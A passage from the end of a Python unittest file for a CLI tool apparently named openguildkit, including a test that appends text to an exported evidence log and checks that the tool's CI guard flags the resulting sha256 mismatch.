        self.assertIn("not signed", self.ci(code=1)["problems"][0])

    @unittest.skipUnless(shutil.which("git"), "needs git")
    def test_a_journal_that_no_longer_matches_fails_guard_ci(self):
        command = f'"{sys.executable}" -c "import sys; sys.exit(0)"'
        self.branch_with_change(checks=[command], guard="enforce")
        self.approve_example()
        self.run_cli("task", "verify", TASK)
        self.run_cli("task", "export", TASK)
        record = json.loads((self.root / ".openguildkit" / "decisions" / f"{TASK}.json").read_text(encoding="utf-8"))
        journal = record["result"]["journals"][0]
        self.assertEqual(journal["check"], "command:1")
        self.git("add", "-A")
        self.git("commit", "-q", "-m", "decision")
        before = json.loads(run_project(self.root, "guard", "--ci", "--base", "main", "--json", expect=None).stdout)
        self.assertFalse(any("sha256" in item for item in before["problems"]))
        log = self.root / journal["evidence"]
        log.write_text(log.read_text(encoding="utf-8") + "tampered\n", encoding="utf-8")
        after = json.loads(run_project(self.root, "guard", "--ci", "--base", "main", "--json", expect=1).stdout)
        self.assertTrue(any("command:1" in item and "sha256" in item for item in after["problems"]))


if __name__ == "__main__":
    unittest.main()
